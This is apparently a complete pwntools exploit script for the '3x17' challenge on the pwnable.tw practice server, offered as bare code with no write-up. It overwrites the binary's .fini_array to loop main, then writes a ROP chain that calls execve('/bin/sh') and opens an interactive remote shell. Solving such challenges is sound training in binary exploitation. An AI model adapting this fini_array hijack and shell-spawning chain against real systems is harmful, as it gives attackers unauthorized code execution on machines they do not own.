from pwn import *

PROG = './3x17'

db = "b *0x472bc1\nc"

r = remote('chall.pwnable.tw', 10105)
#r = process(PROG)
#r = gdb.debug(PROG, db)

def payload(addr, data):
    r.sendlineafter(b'addr:', str(addr))
    r.sendafter(b'data:', data)

fini_array = 0x4b40f0
libc_csu_fini = 0x402960
main = 0x401b6d

pop_rdx = 0x446e35
pop_rdi = 0x401696
pop_rax = 0x41e4af
pop_rsi = 0x406c30
syscall = 0x4022b4
leave = 0x472bc1

payload(fini_array, p64(libc_csu_fini) + p64(main))

payload(fini_array + 2*8, p64(0))
payload(fini_array + 3*8, p64(pop_rdi) + p64(fini_array + 0x200))
payload(fini_array + 5*8, p64(pop_rax) + p64(0x3b))
payload(fini_array + 7*8, p64(pop_rsi) + p64(0))

payload(fini_array + 9*8, p64(syscall))

payload(fini_array + 0x200, b'/bin/sh\x00')
payload(fini_array, p64(leave) + p64(pop_rdx))

r.interactive()
